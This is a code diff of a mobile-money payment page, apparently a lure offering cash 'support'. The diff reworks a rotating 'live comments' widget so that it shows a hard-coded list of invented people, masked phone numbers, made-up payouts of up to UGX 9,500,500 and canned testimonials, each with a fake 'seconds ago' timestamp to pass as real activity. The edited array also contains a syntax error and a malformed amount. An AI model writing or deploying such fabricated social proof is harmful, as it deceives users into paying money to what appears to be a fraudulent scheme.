@@ -40,12 +40,7 @@ background:rgba(255,209,0,.18);
 border:1px solid rgba(0,0,0,.12);
 }
 .money{color:#000;}
-label{
-display:block;
-margin:14px 0 6px;
-font-weight:bold;
-font-size:14px;
-}
+label{display:block;margin:14px 0 6px;font-weight:bold;font-size:14px;}
 input{
 width:100%;
 padding:13px;
@@ -60,11 +55,7 @@ input:focus{
 border-color:#000;
 box-shadow:0 0 0 3px rgba(255,209,0,.25);
 }
-.provider-buttons{
-display:flex;
-gap:10px;
-margin-top:10px;
-}
+.provider-buttons{display:flex;gap:10px;margin-top:10px;}
 .provider{
 flex:1;
 padding:12px;
@@ -117,7 +108,12 @@ background:rgba(255,255,255,.9);
 border:1px solid rgba(0,0,0,.08);
 overflow:hidden;
 }
-.live-comments h3{text-align:center;font-size:17px;margin-bottom:15px;position:relative;z-index:2;}
+.live-comments h3,
+.live-comment{
+position:relative;
+z-index:2;
+}
+.live-comments h3{text-align:center;font-size:17px;margin-bottom:15px;}
 .live-comment{
 display:flex;
 align-items:center;
@@ -127,8 +123,6 @@ margin-bottom:10px;
 border-radius:12px;
 background:rgba(255,209,0,.18);
 border:1px solid rgba(0,0,0,.12);
-position:relative;
-z-index:2;
 }
 .live-avatar{
 width:42px;
@@ -148,13 +142,13 @@ flex-shrink:0;
 
 .flower-rain{
 position:absolute;
-top:42px;
+top:0;
 left:0;
 width:100%;
-height:190px;
+height:100%;
 pointer-events:none;
-z-index:1;
 overflow:hidden;
+z-index:1;
 }
 .rain-flower{
 position:absolute;
@@ -213,18 +207,18 @@ animation:flowerFall linear forwards;
 <div class="live-comment">
 <div class="live-avatar">💰</div>
 <div class="live-content">
-<strong id="liveName1">Amina</strong>
-<p><span id="livePhone1">07*****95</span> completed an application</p>
-<small id="liveTime1">5s ago</small>
+<strong id="liveName1">Peter</strong>
+<p id="liveText1">07*****53 received UGX 65,000 support</p>
+<small id="liveTime1">7s ago</small>
 </div>
 </div>
 
 <div class="live-comment">
 <div class="live-avatar">💰</div>
 <div class="live-content">
-<strong id="liveName2">Brian</strong>
-<p><span id="livePhone2">07*****28</span> completed an application</p>
-<small id="liveTime2">12s ago</small>
+<strong id="liveName2">Esther</strong>
+<p id="liveText2">07*****16 received UGX 85,000 support</p>
+<small id="liveTime2">11s ago</small>
 </div>
 </div>
 
@@ -286,12 +280,7 @@ function setMessage(text,type=""){
 msg.textContent=text;
 msg.className=type;
 }
-
-/* FIX ADDED - keeps everything else unchanged */
-function setStatus(text,type=""){
-setMessage(text,type);
-}
-
+function setStatus(text,type=""){setMessage(text,type);}
 function setLoading(state,text){
 payBtn.disabled=state;
 payBtn.textContent=state?text:"💳 Continue Payment";
@@ -393,22 +382,17 @@ setStatus("Please complete the payment on your phone.");
 }
 
 if(["SUCCESS","SUCCESSFUL","COMPLETED"].includes(status)){
-
 localStorage.removeItem("currentTransaction");
 currentTransaction=null;
-
 setMessage("Payment successful. Redirecting...","success");
 setLoading(true,"Confirmed");
-
 setTimeout(()=>window.location.href="delivery.html",1000);
 return;
 }
 
 if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
-
 localStorage.removeItem("currentTransaction");
 currentTransaction=null;
-
 throw new Error("Payment "+status.toLowerCase()+".");
 }
 
@@ -453,16 +437,29 @@ setInterval(createRainFlower,180);
 /* LIVE COMMENTS */
 
 const livePeople=[
-["Amina","07*****37","Application submitted","5s ago"],
-["Brian","07*****47","Received UGX 1,700,500","19s ago"],
-["Grace","07*****65","Application submitted","16s ago"],
-["Sarah","07*****39","Received UGX 4,524,500","8s ago"],
-["John","07*****95","Application submitted","5s ago"],
-["David","07*****28","Received UGX 2,100,500","12s ago"],
-["Faith","07*****74","Received UGX 3,100,500","10s ago"],
-["Mary","07*****71","Application submitted","9s ago"],
-["Peter","07*****84","Received UGX 1,228,500","15s ago"],
-["James","07*****53","Received UGX 5,624,500","20s ago"]
+["Peter","07*****53 received UGX 1,228,500 support","7s ago"],
+["Esther","07*****16 received UGX 1,228,500 support","11s ago"],
+["Amina","07*****37 received UGX 9,500,500 support","3s ago"],
+["Brian","07*****47 received UGX 2,100 500 support","19s ago"],
+["Winfred Chepkemoi", "Everything was easy to understand.", "12s ago"],
+["Victor Ochieng", "The application process was simple.", "15s ago"],
+["Mary Wanjiku", "Customer support was very helpful.", "18s ago"],
+["Brian Kiptoo", "I liked how easy it was to apply.", "21s ago"],
+["Faith Njeri", "The experience was smooth from start to finish.", "25s ago"],
+["James Mutua", "The website was easy to use.", "30s ago"],
+["Grace Atieno", "The instructions were clear and helpful.", "34s ago"],
+["Peter Mwangi", "Everything worked well on my phone.", "39s ago"],
+["Chebet Mercy", "A very straightforward experience.", "43s ago"],
+["John Omondi", "The process was fast and simple.", "48s ago"],
+["Daniel Wekesa", "I completed the application without problems.", "54s ago"],
+["Faith Akinyi", "The design is clean and easy to follow.", "59s ago"],
+["Kiplagat Eric", "A smooth experience from beginning to end.", "1m ago"]
+["Grace","07*****95 received UGX 3,100,500 support","5s ago"],
+["David","07*****28 received UGX 1,228,500 support","12s ago"],
+["John","07*****71 received UGX 1,700,5000 support","9s ago"],
+["Ruth","07*****84 received UGX 4,524,500 support","15s ago"],
+["Joseph","07*****90 received UGX 9,500,500 support","2s ago"],
+["Doreen","07*****99 received UGX 1,700,500 support","1m ago"]
 ];
 
 let current=0;
@@ -472,18 +469,19 @@ const p1=livePeople[current];
 const p2=livePeople[(current+1)%livePeople.length];
 
 liveName1.textContent=p1[0];
-livePhone1.textContent=p1[1];
-liveTime1.textContent=p1[3];
+liveText1.textContent=p1[1];
+liveTime1.textContent=p1[2];
 
 liveName2.textContent=p2[0];
-livePhone2.textContent=p2[1];
-liveTime2.textContent=p2[3];
+liveText2.textContent=p2[1];
+liveTime2.textContent=p2[2];
 
 current=(current+2)%livePeople.length;
 }
 
 updateLiveComments();
 setInterval(updateLiveComments,5000);
+
 </script>
 
 </body>
